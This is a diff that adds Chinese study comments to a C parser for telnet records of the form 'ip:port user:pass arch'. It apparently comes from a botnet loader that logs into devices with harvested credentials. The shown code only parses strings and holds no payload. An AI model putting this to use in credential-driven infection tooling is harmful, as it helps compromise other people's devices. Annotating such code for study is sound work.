@@ -1,3 +1,6 @@
+//解析telnet信息
+
+
 #include <stdio.h>
 #include <stdint.h>
 #include <stdlib.h>
@@ -5,6 +8,7 @@
 #include "headers/includes.h"
 #include "headers/telnet_info.h"
 
+//将各个字段存入info结构体中
 struct telnet_info *telnet_info_new(char *user, char *pass, char *arch, ipv4_t addr, port_t port, struct telnet_info *info)
 {
     if (user != NULL)
@@ -22,6 +26,7 @@ struct telnet_info *telnet_info_new(char *user, char *pass, char *arch, ipv4_t a
     return info;
 }
 
+//从str中解析出各个字段，调用telnet_info_new
 struct telnet_info *telnet_info_parse(char *str, struct telnet_info *out) // Format: ip:port user:pass arch
 {
     char *conn, *auth, *arch;
@@ -35,9 +40,9 @@ struct telnet_info *telnet_info_parse(char *str, struct telnet_info *out) // For
         return NULL;
     arch = strtok(NULL, " "); // We don't care if we don't know the arch
 
-    if ((addr_str = strtok(conn, ":")) == NULL)
+    if ((addr_str = strtok(conn, ":")) == NULL)　//ip
         return NULL;
-    if ((port_str = strtok(NULL, ":")) == NULL)
+    if ((port_str = strtok(NULL, ":")) == NULL) //port
         return NULL;
 
     if (strlen(auth) == 1)
@@ -52,8 +57,8 @@ struct telnet_info *telnet_info_parse(char *str, struct telnet_info *out) // For
     }
     else
     {
-        user = strtok(auth, ":");
-        pass = strtok(NULL, ":");
+        user = strtok(auth, ":"); //user
+        pass = strtok(NULL, ":"); //password
     }
 
     addr = inet_addr(addr_str);
